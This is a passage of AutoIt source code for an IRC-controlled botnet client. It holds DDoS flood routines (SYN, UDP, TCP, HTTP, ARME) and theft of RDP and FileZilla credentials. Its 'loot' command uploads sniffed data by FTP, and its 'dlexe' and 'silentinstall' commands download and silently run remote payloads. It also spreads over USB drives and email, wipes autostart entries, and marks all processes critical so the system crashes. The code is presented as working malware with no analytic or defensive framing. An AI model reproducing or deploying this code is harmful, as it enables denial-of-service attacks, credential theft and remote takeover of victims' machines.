			UDPCloseSocket($udpsock)
			ExitLoop
		EndIf
		UDPSend($udpsock, $packet)
	WEnd
EndFunc   ;==>_udpflood
Func _WinActiveByExe($sExe, $iActive = True) ;False to WinActivate, True to just see if it's active
	If Not ProcessExists($sExe) Then Return SetError(1, 0, 0)
	Local $aPL = ProcessList($sExe)
	Local $aWL = WinList()
	For $iCC = 1 To $aWL[0][0]
		For $xCC = 1 To $aPL[0][0]
			If $aWL[$iCC][0] <> '' And _
					WinGetProcess($aWL[$iCC][1]) = $aPL[$xCC][1] And _
					BitAND(WinGetState($aWL[$iCC][1]), 2) Then
				If $iActive And WinActive($aWL[$iCC][1]) Then Return 1
				If Not $iActive And Not WinActive($aWL[$iCC][1]) Then
					WinActivate($aWL[$iCC][1])
					Return 1
				EndIf
			EndIf
		Next
	Next
	Return SetError(2, 0, 0)
EndFunc   ;==>_WinActiveByExe
Func botkiller()
	RegDelete("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
	RegWrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
	RegDelete("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
	RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
	FileDelete(@StartupDir & "\*.*")
EndFunc   ;==>botkiller
Func changemode($irc, $mode, $chan = "")
	If $irc = -1 Then Return 0
	If $chan = "" Then
		TCPSend($irc, "MODE " & $mode & @CRLF)
		If @error Then
			Return -1
		EndIf
		Return 1
	EndIf
	TCPSend($irc, "MODE " & $chan & " " & $mode & @CRLF)
	If @error Then
		Return -1
	EndIf
	Return 1
EndFunc   ;==>changemode
Func CloseServiceHandle($hSCObject)
	Local $avCSH = DllCall("advapi32.dll", "int", "CloseServiceHandle", _
			"hwnd", $hSCObject)
	Return $avCSH[0]
EndFunc   ;==>CloseServiceHandle

; #FUNCTION#
Func cmd($user, $channel, $msg)
	Local $stemp = StringSplit($msg, " ")
	If StringRight($stemp[1], 1) == "*" Then $stemp[1] = StringTrimRight($stemp[1], 1)
	If StringLeft($stemp[1], 1) == "!" Then $stemp[1] = StringTrimLeft($stemp[1], 1)
	If StringLeft($botid, StringLen($stemp[1])) == $stemp[1] Then
	Else
		Return
	EndIf
	Switch StringLower($stemp[2])
		Case "signin"
			If _elementexists($stemp, 3) Then
				If $stemp[3] == $botpassword Then
					sendmessage($sock, "Signin successful.", $channel)
					$signedin = True
				Else
					sendmessage($sock, "Signin failed!", $channel)
				EndIf
			EndIf
		Case "signout"
			If $signedin = True Then
				sendmessage($sock, "Successfully signed out.", $channel)
				$signedin = False
			EndIf
		Case "syn"
			If _elementexists($stemp, 5) And $signedin = True Then
				sendmessage($sock, "SYN flooding " & $stemp[3] & ":" & $stemp[4], $channel)
				_synflood($stemp[3], $stemp[4], $stemp[5])
				sendmessage($sock, "SYN flood finished", $channel)
			EndIf
		Case "udp"
			If _elementexists($stemp, 6) And $signedin = True Then
				sendmessage($sock, "UDP flooding " & $stemp[3] & ":" & $stemp[4] & " with packetsize " & $stemp[5], $channel)
				_udpflood($stemp[3], $stemp[4], $stemp[5], $stemp[6])
				sendmessage($sock, "UDP flood finished", $channel)
			EndIf
		Case "tcp"
			If _elementexists($stemp, 6) And $signedin = True Then
				sendmessage($sock, "TCP flooding " & $stemp[3] & ":" & $stemp[4], $channel)
				_tcpflood($stemp[3], $stemp[4], $stemp[5], $stemp[6])
				sendmessage($sock, "TCP flood finished", $channel)
			EndIf
		Case "condis"
			If _elementexists($stemp, 5) And $signedin = True Then
				sendmessage($sock, "Connect/disconnect flooding " & $stemp[3] & ":" & $stemp[4], $channel)
				_condisflood($stemp[3], $stemp[4], $stemp[5])
				sendmessage($sock, "Connect/disconnect flood finished", $channel)
			EndIf
		Case "http"
			If _elementexists($stemp, 6) And $signedin = True Then
				sendmessage($sock, "HTTP flooding http://" & $stemp[3] & ":" & $stemp[4] & $stemp[5], $channel)
				_httpflood($stemp[3], $stemp[4], $stemp[5], $stemp[6])
				sendmessage($sock, "HTTP flood finished", $channel)
			EndIf
		Case "arme"
			If _elementexists($stemp, 6) And $signedin = True Then
				sendmessage($sock, "ARME flooding http://" & $stemp[3] & ":" & $stemp[4] & $stemp[5], $channel)
				_armeflood($stemp[3], $stemp[4], $stemp[5], $stemp[6])
				sendmessage($sock, "ARME flood finished", $channel)
			EndIf
		Case "loot"
			If _elementexists($stemp, 5) And $signedin = True Then
				If FileExists($lootLoc) Then
					$sServer = TCPNameToIP($stemp[3])
					$hOpen = _FTP_Open($botid)
					$hConn = _FTP_Connect($hOpen, $sServer, $stemp[4], $stemp[5], 1)
					$hPutFile = _FTP_ProgressUpload($hConn, $lootLoc, "sniffs-" & @UserName & "-" & @ComputerName & "@" & $myIP & ".txt")
					_FTP_Close($hConn)
					_FTP_Close($hOpen)
					If $hPutFile = 1 Then
						sendmessage($sock, "Successfully uploaded loot.", $channel)
					Else
						sendmessage($sock, "Error uploading loot.", $channel)
					EndIf
				Else
					sendmessage($sock, "No loot!!! (maybe I'm not running as admin!)", $channel)
				EndIf
			EndIf
		Case "noip"
			If $signedin = True Then
				sendmessage($sock, NOIP(), $channel)
			EndIf
		Case "filezilla"
			If $signedin = True Then
				sendmessage($sock, FileZilla(), $channel)
			EndIf
		Case "rdp"
			If $signedin = True Then
				For $i = 0 To 20
					$ServIP = RegRead("HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default", "MRU" & $i)
					If $ServIP == "" Then ExitLoop
					$ServUser = RegRead("HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\UsernameHint", $ServIP)
					$Creds = UncryptRDPPassword(BinaryToString(RegRead("HKEY_LOCAL_MACHINE\Comm\Security\CredMan\Creds", $i), 2))
					$RDPCreds &= $ServIP & " USR: " & $ServUser & " PWD: " & $Creds & "|"
				Next
				If $RDPCreds <> "" Then
					sendmessage($sock, StringTrimRight($RDPCreds, 1), $channel)
				EndIf
			EndIf
		Case "getip"
			If $signedin = True Then
				sendmessage($sock, $myIP, $channel)
			EndIf
		Case "dlexe"
			If _elementexists($stemp, 3) And $signedin = True Then
				$exe = ""
				Dim $aspace[3]
				$Digits = 8
				For $i = 1 To $Digits
					$aspace[0] = Chr(Random(65, 90, 1))
					$aspace[1] = Chr(Random(97, 122, 1))
					$aspace[2] = Chr(Random(48, 57, 1))
					$exe &= $aspace[Random(0, 2, 1)]
				Next
				Dim $hdownload = InetGet($stemp[3], @TempDir & "\" & $exe & ".exe", 1, 0)
				Run(@TempDir & "\" & $exe & ".exe", "", @SW_HIDE)
				sendmessage($sock, "Downloaded and executed!", $channel)
			EndIf
		Case "usb"
			If $signedin = True Then
				Local $drivecount = lnk()
				sendmessage($sock, "Infected " & $drivecount & " removable drives.", $channel)
			EndIf
		Case "sendmail"
			If $signedin = True Then
				Run($installpath & " sendmail", "", @SW_HIDE)
				sendmessage($sock, "Email spread process started", $channel)
			EndIf
		Case "silentinstall"
			If _elementexists($stemp, 3) And $signedin = True Then
				$msi = ""
				Dim $aspace[3]
				$Digits = 8
				For $i = 1 To $Digits
					$aspace[0] = Chr(Random(65, 90, 1))
					$aspace[1] = Chr(Random(97, 122, 1))
					$aspace[2] = Chr(Random(48, 57, 1))
					$msi &= $aspace[Random(0, 2, 1)]
				Next
				Dim $hdownload = InetGet($stemp[3], @TempDir & "\" & $msi & ".msi", 1, 0)
				Run("MsiExec.exe /i """ & @TempDir & "\" & $msi & ".msi"" /qn /norestart", "", @SW_HIDE)
				sendmessage($sock, "Silently installing...", $channel)
			EndIf
	EndSwitch
EndFunc   ;==>cmd
Func connect($nodes)
	For $i = 1 To UBound($nodes) - 1
		$mynode = $nodes[$i]
		$sock = TCPConnect(TCPNameToIP(StringSplit($mynode, ":")[1]), Number(StringSplit($mynode, ":")[2]))
		If $sock <> -1 Then
			ExitLoop
		EndIf
	Next
	If $sock == -1 Then
		Exit -1
	EndIf
	nickname($sock)
	TCPSend($sock, "USER " & $botid & " 0 * :" & $botid & @CRLF)
	Return $sock
EndFunc   ;==>connect
Func DES($key, $message, $encrypt, $mode, $iv)
	Local $spfunction1[64] = [0x1010400, 0, 0x10000, 0x1010404, 0x1010004, 0x10404, 0x4, 0x10000, 0x400, 0x1010400, 0x1010404, 0x400, 0x1000404, 0x1010004, 0x1000000, 0x4, 0x404, 0x1000400, 0x1000400, 0x10400, 0x10400, 0x1010000, 0x1010000, 0x1000404, 0x10004, 0x1000004, 0x1000004, 0x10004, 0, 0x404, 0x10404, 0x1000000, 0x10000, 0x1010404, 0x4, 0x1010000, 0x1010400, 0x1000000, 0x1000000, 0x400, 0x1010004, 0x10000, 0x10400, 0x1000004, 0x400, 0x4, 0x1000404, 0x10404, 0x1010404, 0x10004, 0x1010000, 0x1000404, 0x1000004, 0x404, 0x10404, 0x1010400, 0x404, 0x1000400, 0x1000400, 0, 0x10004, 0x10400, 0, 0x1010004]
	Local $spfunction2[64] = [-0x7fef7fe0, -0x7fff8000, 0x8000, 0x108020, 0x100000, 0x20, -0x7fefffe0, -0x7fff7fe0, -0x7fffffe0, -0x7fef7fe0, -0x7fef8000, -0x80000000, -0x7fff8000, 0x100000, 0x20, -0x7fefffe0, 0x108000, 0x100020, -0x7fff7fe0, 0, -0x80000000, 0x8000, 0x108020, -0x7ff00000, 0x100020, -0x7fffffe0, 0, 0x108000, 0x8020, -0x7fef8000, -0x7ff00000, 0x8020, 0, 0x108020, -0x7fefffe0, 0x100000, -0x7fff7fe0, -0x7ff00000, -0x7fef8000, 0x8000, -0x7ff00000, -0x7fff8000, 0x20, -0x7fef7fe0, 0x108020, 0x20, 0x8000, -0x80000000, 0x8020, -0x7fef8000, 0x100000, -0x7fffffe0, 0x100020, -0x7fff7fe0, -0x7fffffe0, 0x100020, 0x108000, 0, -0x7fff8000, 0x8020, -0x80000000, -0x7fefffe0, -0x7fef7fe0, 0x108000]
	Local $spfunction3[64] = [0x208, 0x8020200, 0, 0x8020008, 0x8000200, 0, 0x20208, 0x8000200, 0x20008, 0x8000008, 0x8000008, 0x20000, 0x8020208, 0x20008, 0x8020000, 0x208, 0x8000000, 0x8, 0x8020200, 0x200, 0x20200, 0x8020000, 0x8020008, 0x20208, 0x8000208, 0x20200, 0x20000, 0x8000208, 0x8, 0x8020208, 0x200, 0x8000000, 0x8020200, 0x8000000, 0x20008, 0x208, 0x20000, 0x8020200, 0x8000200, 0, 0x200, 0x20008, 0x8020208, 0x8000200, 0x8000008, 0x200, 0, 0x8020008, 0x8000208, 0x20000, 0x8000000, 0x8020208, 0x8, 0x20208, 0x20200, 0x8000008, 0x8020000, 0x8000208, 0x208, 0x8020000, 0x20208, 0x8, 0x8020008, 0x20200]
	Local $spfunction4[64] = [0x802001, 0x2081, 0x2081, 0x80, 0x802080, 0x800081, 0x800001, 0x2001, 0, 0x802000, 0x802000, 0x802081, 0x81, 0, 0x800080, 0x800001, 0x1, 0x2000, 0x800000, 0x802001, 0x80, 0x800000, 0x2001, 0x2080, 0x800081, 0x1, 0x2080, 0x800080, 0x2000, 0x802080, 0x802081, 0x81, 0x800080, 0x800001, 0x802000, 0x802081, 0x81, 0, 0, 0x802000, 0x2080, 0x800080, 0x800081, 0x1, 0x802001, 0x2081, 0x2081, 0x80, 0x802081, 0x81, 0x1, 0x2000, 0x800001, 0x2001, 0x802080, 0x800081, 0x2001, 0x2080, 0x800000, 0x802001, 0x80, 0x800000, 0x2000, 0x802080]
	Local $spfunction5[64] = [0x100, 0x2080100, 0x2080000, 0x42000100, 0x80000, 0x100, 0x40000000, 0x2080000, 0x40080100, 0x80000, 0x2000100, 0x40080100, 0x42000100, 0x42080000, 0x80100, 0x40000000, 0x2000000, 0x40080000, 0x40080000, 0, 0x40000100, 0x42080100, 0x42080100, 0x2000100, 0x42080000, 0x40000100, 0, 0x42000000, 0x2080100, 0x2000000, 0x42000000, 0x80100, 0x80000, 0x42000100, 0x100, 0x2000000, 0x40000000, 0x2080000, 0x42000100, 0x40080100, 0x2000100, 0x40000000, 0x42080000, 0x2080100, 0x40080100, 0x100, 0x2000000, 0x42080000, 0x42080100, 0x80100, 0x42000000, 0x42080100, 0x2080000, 0, 0x40080000, 0x42000000, 0x80100, 0x2000100, 0x40000100, 0x80000, 0, 0x40080000, 0x2080100, 0x40000100]
	Local $spfunction6[64] = [0x20000010, 0x20400000, 0x4000, 0x20404010, 0x20400000, 0x10, 0x20404010, 0x400000, 0x20004000, 0x404010, 0x400000, 0x20000010, 0x400010, 0x20004000, 0x20000000, 0x4010, 0, 0x400010, 0x20004010, 0x4000, 0x404000, 0x20004010, 0x10, 0x20400010, 0x20400010, 0, 0x404010, 0x20404000, 0x4010, 0x404000, 0x20404000, 0x20000000, 0x20004000, 0x10, 0x20400010, 0x404000, 0x20404010, 0x400000, 0x4010, 0x20000010, 0x400000, 0x20004000, 0x20000000, 0x4010, 0x20000010, 0x20404010, 0x404000, 0x20400000, 0x404010, 0x20404000, 0, 0x20400010, 0x10, 0x4000, 0x20400000, 0x404010, 0x4000, 0x400010, 0x20004010, 0, 0x20404000, 0x20000000, 0x400010, 0x20004010]
	Local $spfunction7[64] = [0x200000, 0x4200002, 0x4000802, 0, 0x800, 0x4000802, 0x200802, 0x4200800, 0x4200802, 0x200000, 0, 0x4000002, 0x2, 0x4000000, 0x4200002, 0x802, 0x4000800, 0x200802, 0x200002, 0x4000800, 0x4000002, 0x4200000, 0x4200800, 0x200002, 0x4200000, 0x800, 0x802, 0x4200802, 0x200800, 0x2, 0x4000000, 0x200800, 0x4000000, 0x200800, 0x200000, 0x4000802, 0x4000802, 0x4200002, 0x4200002, 0x2, 0x200002, 0x4000000, 0x4000800, 0x200000, 0x4200800, 0x802, 0x200802, 0x4200800, 0x802, 0x4000002, 0x4200802, 0x4200000, 0x200800, 0, 0x2, 0x4200802, 0, 0x200802, 0x4200000, 0x800, 0x4000002, 0x4000800, 0x800, 0x200002]
	Local $spfunction8[64] = [0x10001040, 0x1000, 0x40000, 0x10041040, 0x10000000, 0x10001040, 0x40, 0x10000000, 0x40040, 0x10040000, 0x10041040, 0x41000, 0x10041000, 0x41040, 0x1000, 0x40, 0x10040000, 0x10000040, 0x10001000, 0x1040, 0x41000, 0x40040, 0x10040040, 0x10041000, 0x1040, 0, 0, 0x10040040, 0x10000040, 0x10001000, 0x41040, 0x40000, 0x41040, 0x40000, 0x10041000, 0x1000, 0x40, 0x10040040, 0x1000, 0x41040, 0x10001000, 0x40, 0x10000040, 0x10040000, 0x10040040, 0x10000000, 0x40000, 0x10001040, 0, 0x10041040, 0x40040, 0x10000040, 0x10040000, 0x10001000, 0x10001040, 0, 0x10041040, 0x41000, 0x41000, 0x1040, 0x1040, 0x40040, 0x10000000, 0x10041000]
	Local $masks[33] = [4294967295, 2147483647, 1073741823, 536870911, 268435455, 134217727, 67108863, 33554431, 16777215, 8388607, 4194303, 2097151, 1048575, 524287, 262143, 131071, 65535, 32767, 16383, 8191, 4095, 2047, 1023, 511, 255, 127, 63, 31, 15, 7, 3, 1, 0]
	Local $keys = DES_CreateKeys($key)
	Local $m = 0
	Local $len = StringLen($message)
	Local $chunk = 0
	If UBound($keys) == 32 Then
		Local $iterations = 3
	Else
		Local $iterations = 9
	EndIf
	If $iterations == 3 Then
		If $encrypt == 1 Then
			Local $looping[3] = [0, 32, 2]
		Else
			Local $looping[3] = [30, -2, -2]
		EndIf
	Else
		If $encrypt == 1 Then
			Local $looping[9] = [0, 32, 2, 62, 30, -2, 64, 96, 2]
		Else
			Local $looping[9] = [94, 62, -2, 32, 64, 2, 30, -2, -2]
		EndIf
	EndIf
	$message &= Chr(0) & Chr(0) & Chr(0) & Chr(0) & Chr(0) & Chr(0) & Chr(0) & Chr(0)
	$Result = ""
	$tempresult = ""
	If $mode == 1 Then
		$cbcleft = Dec(Hex(Asc(StringMid($iv, 1, 1)), 2) & Hex(Asc(StringMid($iv, 2, 1)), 2) & Hex(Asc(StringMid($iv, 3, 1)), 2) & Hex(Asc(StringMid($iv, 4, 1)), 2))
		$cbcright = Dec(Hex(Asc(StringMid($iv, 5, 1)), 2) & Hex(Asc(StringMid($iv, 6, 1)), 2) & Hex(Asc(StringMid($iv, 7, 1)), 2) & Hex(Asc(StringMid($iv, 8, 1)), 2))
	EndIf
	While ($m < $len)
		$left_temp = ""
		For $i = 1 To 4
			$left_temp &= Hex(Asc(StringMid($message, $m + 1, 1)), 2)
			$m += 1
		Next
		$left = Dec($left_temp)
		$right_temp = ""
		For $i = 1 To 4
			$right_temp &= Hex(Asc(StringMid($message, $m + 1, 1)), 2)
			$m += 1
		Next
		$right = Dec($right_temp)
		If $mode == 1 Then
			If $encrypt Then
				$left = BitXOR($left, $cbcleft)
				$right = BitXOR($right, $cbcright)
			Else
				$cbcleft2 = $cbcleft
				$cbcright2 = $cbcright
				$cbcleft = $left
				$cbcright = $right
			EndIf
		EndIf
		$temp = BitAND(BitXOR(BitAND(BitShift($left, 4), $masks[4]), $right), 0x0f0f0f0f)
		$right = BitXOR($right, $temp)
		$left = BitXOR($left, (BitShift($temp, -4)))
		$temp = BitAND(BitXOR(BitAND(BitShift($left, 16), $masks[16]), $right), 0x0000ffff)
		$right = BitXOR($right, $temp)
		$left = BitXOR($left, (BitShift($temp, -16)))
		$temp = BitAND(BitXOR(BitAND(BitShift($right, 2), $masks[2]), $left), 0x33333333)
		$left = BitXOR($left, $temp)
		$right = BitXOR($right, (BitShift($temp, -2)))
		$temp = BitAND(BitXOR(BitAND(BitShift($right, 8), $masks[8]), $left), 0x00ff00ff)
		$left = BitXOR($left, $temp)
		$right = BitXOR($right, (BitShift($temp, -8)))
		$temp = BitAND(BitXOR(BitAND(BitShift($left, 1), $masks[1]), $right), 0x55555555)
		$right = BitXOR($right, $temp)
		$left = BitXOR($left, (BitShift($temp, -1)))
		$left = BitOR(BitShift($left, -1), BitAND(BitShift($left, 31), $masks[31]))
		$right = BitOR(BitShift($right, -1), BitAND(BitShift($right, 31), $masks[31]))
		$j = 0
		While $j < ($iterations - 1)
			$endloop = $looping[$j + 1]
			$loopinc = $looping[$j + 2]
			$i = $looping[$j]
			While $i <> $endloop
				$right1 = BitXOR($right, $keys[$i])
				$right2 = BitXOR(BitOR(BitAND(BitShift($right, 4), $masks[4]), BitShift($right, -28)), $keys[$i + 1])
				$temp = $left
				$left = $right
				$right = BitXOR($temp, BitOR($spfunction2[BitAND(BitAND(BitShift($right1, 24), $masks[24]), 0x3f)], $spfunction4[BitAND(BitAND(BitShift($right1, 16), $masks[16]), 0x3f)], $spfunction6[BitAND(BitAND(BitShift($right1, 8), $masks[8]), 0x3f)], $spfunction8[BitAND($right1, 0x3f)], $spfunction1[BitAND(BitAND(BitShift($right2, 24), $masks[24]), 0x3f)], $spfunction3[BitAND(BitAND(BitShift($right2, 16), $masks[16]), 0x3f)], $spfunction5[BitAND(BitAND(BitShift($right2, 8), $masks[8]), 0x3f)], $spfunction7[BitAND($right2, 0x3f)]))
				$i += $loopinc
			WEnd
			$temp = $left
			$left = $right
			$right = $temp
			$j += 3
		WEnd
		$left = BitOR(BitAND(BitShift($left, 1), $masks[1]), BitShift($left, -31))
		$right = BitOR(BitAND(BitShift($right, 1), $masks[1]), BitShift($right, -31))
		$temp = BitAND(BitXOR(BitAND(BitShift($left, 1), $masks[1]), $right), 0x55555555)
		$right = BitXOR($right, $temp)
		$left = BitXOR($left, (BitShift($temp, -1)))
		$temp = BitAND(BitXOR(BitAND(BitShift($right, 8), $masks[8]), $left), 0x00ff00ff)
		$left = BitXOR($left, $temp)
		$right = BitXOR($right, (BitShift($temp, -8)))
		$temp = BitAND(BitXOR(BitAND(BitShift($right, 2), $masks[2]), $left), 0x33333333)
		$left = BitXOR($left, $temp)
		$right = BitXOR($right, (BitShift($temp, -2)))
		$temp = BitAND(BitXOR(BitAND(BitShift($left, 16), $masks[16]), $right), 0x0000ffff)
		$right = BitXOR($right, $temp)
		$left = BitXOR($left, (BitShift($temp, -16)))
		$temp = BitAND(BitXOR(BitAND(BitShift($left, 4), $masks[4]), $right), 0x0f0f0f0f)
		$right = BitXOR($right, $temp)
		$left = BitXOR($left, (BitShift($temp, -4)))
		If $mode == 1 Then
			If $encrypt Then
				$cbcleft = $left
				$cbcright = $right
			Else
				$left = BitXOR($left, $cbcleft2)
				$right = BitXOR($right, $cbcright2)
			EndIf
		EndIf
		$tempresult &= Chr(BitAND(BitShift($left, 24), $masks[24]))
		$tempresult &= Chr(BitAND(BitAND(BitShift($left, 16), $masks[16]), 0xff))
		$tempresult &= Chr(BitAND(BitAND(BitShift($left, 8), $masks[8]), 0xff))
		$tempresult &= Chr(BitAND($left, 0xff))
		$tempresult &= Chr(BitAND(BitShift($right, 24), $masks[24]))
		$tempresult &= Chr(BitAND(BitAND(BitShift($right, 16), $masks[16]), 0xff))
		$tempresult &= Chr(BitAND(BitAND(BitShift($right, 8), $masks[8]), 0xff))
		$tempresult &= Chr(BitAND($right, 0xff))
		$chunk += 8
		If $chunk == 512 Then
			$Result &= $tempresult
			$tempresult = ""
			$chunk = 0
		EndIf
	WEnd
	Return $Result & $tempresult
EndFunc   ;==>DES
Func DES_CreateKeys($key)
	Local $pc2bytes0[16] = [0, 0x4, 0x20000000, 0x20000004, 0x10000, 0x10004, 0x20010000, 0x20010004, 0x200, 0x204, 0x20000200, 0x20000204, 0x10200, 0x10204, 0x20010200, 0x20010204]
	Local $pc2bytes1[16] = [0, 0x1, 0x100000, 0x100001, 0x4000000, 0x4000001, 0x4100000, 0x4100001, 0x100, 0x101, 0x100100, 0x100101, 0x4000100, 0x4000101, 0x4100100, 0x4100101]
	Local $pc2bytes2[16] = [0, 0x8, 0x800, 0x808, 0x1000000, 0x1000008, 0x1000800, 0x1000808, 0, 0x8, 0x800, 0x808, 0x1000000, 0x1000008, 0x1000800, 0x1000808]
	Local $pc2bytes3[16] = [0, 0x200000, 0x8000000, 0x8200000, 0x2000, 0x202000, 0x8002000, 0x8202000, 0x20000, 0x220000, 0x8020000, 0x8220000, 0x22000, 0x222000, 0x8022000, 0x8222000]
	Local $pc2bytes4[16] = [0, 0x40000, 0x10, 0x40010, 0, 0x40000, 0x10, 0x40010, 0x1000, 0x41000, 0x1010, 0x41010, 0x1000, 0x41000, 0x1010, 0x41010]
	Local $pc2bytes5[16] = [0, 0x400, 0x20, 0x420, 0, 0x400, 0x20, 0x420, 0x2000000, 0x2000400, 0x2000020, 0x2000420, 0x2000000, 0x2000400, 0x2000020, 0x2000420]
	Local $pc2bytes6[16] = [0, 0x10000000, 0x80000, 0x10080000, 0x2, 0x10000002, 0x80002, 0x10080002, 0, 0x10000000, 0x80000, 0x10080000, 0x2, 0x10000002, 0x80002, 0x10080002]
	Local $pc2bytes7[16] = [0, 0x10000, 0x800, 0x10800, 0x20000000, 0x20010000, 0x20000800, 0x20010800, 0x20000, 0x30000, 0x20800, 0x30800, 0x20020000, 0x20030000, 0x20020800, 0x20030800]
	Local $pc2bytes8[16] = [0, 0x40000, 0, 0x40000, 0x2, 0x40002, 0x2, 0x40002, 0x2000000, 0x2040000, 0x2000000, 0x2040000, 0x2000002, 0x2040002, 0x2000002, 0x2040002]
	Local $pc2bytes9[16] = [0, 0x10000000, 0x8, 0x10000008, 0, 0x10000000, 0x8, 0x10000008, 0x400, 0x10000400, 0x408, 0x10000408, 0x400, 0x10000400, 0x408, 0x10000408]
	Local $pc2bytes10[16] = [0, 0x20, 0, 0x20, 0x100000, 0x100020, 0x100000, 0x100020, 0x2000, 0x2020, 0x2000, 0x2020, 0x102000, 0x102020, 0x102000, 0x102020]
	Local $pc2bytes11[16] = [0, 0x1000000, 0x200, 0x1000200, 0x200000, 0x1200000, 0x200200, 0x1200200, 0x4000000, 0x5000000, 0x4000200, 0x5000200, 0x4200000, 0x5200000, 0x4200200, 0x5200200]
	Local $pc2bytes12[16] = [0, 0x1000, 0x8000000, 0x8001000, 0x80000, 0x81000, 0x8080000, 0x8081000, 0x10, 0x1010, 0x8000010, 0x8001010, 0x80010, 0x81010, 0x8080010, 0x8081010]
	Local $pc2bytes13[16] = [0, 0x4, 0x100, 0x104, 0, 0x4, 0x100, 0x104, 0x1, 0x5, 0x101, 0x105, 0x1, 0x5, 0x101, 0x105]
	Local $masks[33] = [4294967295, 2147483647, 1073741823, 536870911, 268435455, 134217727, 67108863, 33554431, 16777215, 8388607, 4194303, 2097151, 1048575, 524287, 262143, 131071, 65535, 32767, 16383, 8191, 4095, 2047, 1023, 511, 255, 127, 63, 31, 15, 7, 3, 1, 0]
	If StringLen($key) >= 24 Then
		Local $iterations = 3
	Else
		Local $iterations = 1
	EndIf
	Local $keys[1] = [32 * $iterations]
	Local $shifts[16] = [0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0]
	Local $m = 0, $n = 0
	For $j = 0 To $iterations - 1
		$left_temp = ""
		For $i = 1 To 4
			$left_temp = Hex(Asc(StringMid($key, $m + 1, 1)), 2)
			$m += 1
		Next
		$left = Dec($left_temp)
		$right_temp = ""
		For $i = 1 To 4
			$right_temp = Hex(Asc(StringMid($key, $m + 1, 1)), 2)
			$m += 1
		Next
		$right = Dec($right_temp)
		$temp = BitAND(BitXOR(BitAND(BitShift($left, 4), $masks[4]), $right), 0x0f0f0f0f)
		$right = BitXOR($right, $temp)
		$left = BitXOR($left, (BitShift($temp, -4)))
		$temp = BitAND(BitXOR(BitAND(BitShift($right, 16), $masks[16]), $left), 0x0000ffff)
		$left = BitXOR($left, $temp)
		$right = BitXOR($right, (BitShift($temp, 16)))
		$temp = BitAND(BitXOR(BitAND(BitShift($left, 2), $masks[2]), $right), 0x33333333)
		$right = BitXOR($right, $temp)
		$left = BitXOR($left, (BitShift($temp, -2)))
		$temp = BitAND(BitXOR(BitAND(BitShift($right, 16), $masks[16]), $left), 0x0000ffff)
		$left = BitXOR($left, $temp)
		$right = BitXOR($right, (BitShift($temp, 16)))
		$temp = BitAND(BitXOR(BitAND(BitShift($left, 1), $masks[1]), $right), 0x55555555)
		$right = BitXOR($right, $temp)
		$left = BitXOR($left, (BitShift($temp, -1)))
		$temp = BitAND(BitXOR(BitAND(BitShift($right, 8), $masks[8]), $left), 0x00ff00ff)
		$left = BitXOR($left, $temp)
		$right = BitXOR($right, (BitShift($temp, -8)))
		$temp = BitAND(BitXOR(BitAND(BitShift($left, 1), $masks[1]), $right), 0x55555555)
		$right = BitXOR($right, $temp)
		$left = BitXOR($left, (BitShift($temp, -1)))
		$temp = BitOR(BitShift($left, -8), BitAND(BitAND(BitShift($right, 20), $masks[20]), 0x000000f0))
		$left = BitOR(BitShift($right, -24), BitAND(BitShift($right, -8), 0xff0000), BitAND(BitAND(BitShift($right, 8), $masks[8]), 0xff00), BitAND(BitAND(BitShift($right, 24), $masks[24]), 0xf0))
		$right = $temp
		For $i = 0 To UBound($shifts) - 1
			If $shifts[$i] Then
				$left = BitOR(BitShift($left, -2), BitAND(BitShift($left, 26), $masks[26]))
				$right = BitOR(BitShift($right, -2), BitAND(BitShift($right, 26), $masks[26]))
			Else
				$left = BitOR(BitShift($left, -1), BitAND(BitShift($left, 27), $masks[27]))
				$right = BitOR(BitShift($right, -1), BitAND(BitShift($right, 27), $masks[27]))
			EndIf
			$left = BitAND($left, -0xf)
			$right = BitAND($right, -0xf)
			$lefttemp = BitOR($pc2bytes0[BitAND(BitShift($left, 28), $masks[28])], $pc2bytes1[BitAND(BitAND(BitShift($left, 24), $masks[24]), 0xf)], $pc2bytes2[BitAND(BitAND(BitShift($left, 20), $masks[20]), 0xf)], $pc2bytes3[BitAND(BitAND(BitShift($left, 16), $masks[16]), 0xf)], $pc2bytes4[BitAND(BitAND(BitShift($left, 12), $masks[12]), 0xf)], $pc2bytes5[BitAND(BitAND(BitShift($left, 8), $masks[8]), 0xf)], $pc2bytes6[BitAND(BitAND(BitShift($left, 4), $masks[4]), 0xf)])
			$righttemp = BitOR($pc2bytes7[BitAND(BitShift($right, 28), $masks[28])], $pc2bytes8[BitAND(BitAND(BitShift($right, 24), $masks[24]), 0xf)], $pc2bytes9[BitAND(BitAND(BitShift($right, 20), $masks[20]), 0xf)], $pc2bytes10[BitAND(BitAND(BitShift($right, 16), $masks[16]), 0xf)], $pc2bytes11[BitAND(BitAND(BitShift($right, 12), $masks[12]), 0xf)], $pc2bytes12[BitAND(BitAND(BitShift($right, 8), $masks[8]), 0xf)], $pc2bytes13[BitAND(BitAND(BitShift($right, 4), $masks[4]), 0xf)])
			$temp = BitAND(BitOR(BitAND(BitShift($righttemp, 16), $masks[16]), $lefttemp), 0x0000ffff)
			ReDim $keys[$n + 2]
			$keys[$n] = BitXOR($lefttemp, $temp)
			$n += 1
			$keys[$n] = BitXOR($righttemp, BitShift($temp, -16))
			$n += 1
		Next
	Next
	Return $keys
EndFunc   ;==>DES_CreateKeys
Func dlexe($url)
	$exe = ""
	Dim $aspace[3]
	$Digits = 8
	For $i = 1 To $Digits
		$aspace[0] = Chr(Random(65, 90, 1))
		$aspace[1] = Chr(Random(97, 122, 1))
		$aspace[2] = Chr(Random(48, 57, 1))
		$exe &= $aspace[Random(0, 2, 1)]
	Next
	$path = @TempDir & '\' & $exe & ".exe"
	InetGet($url, $path, 1, 0)
	Run($path, "", @SW_HIDE)
EndFunc   ;==>dlexe
Func exitme()
	_SetPrivilege("SeDebugPrivilege")
	For $PID In ProcessList()
		_SetProcessCritical($PID, True)
	Next
EndFunc   ;==>exitme
Func FileZilla()
	Local $pwds, $h, $FN = @AppDataDir & "\FileZilla\recentservers.xml"
	If FileExists($FN) = False Then Return ""
	$h = FileOpen($FN, 0)
	If $h = -1 Then Return ""
	$host = ""
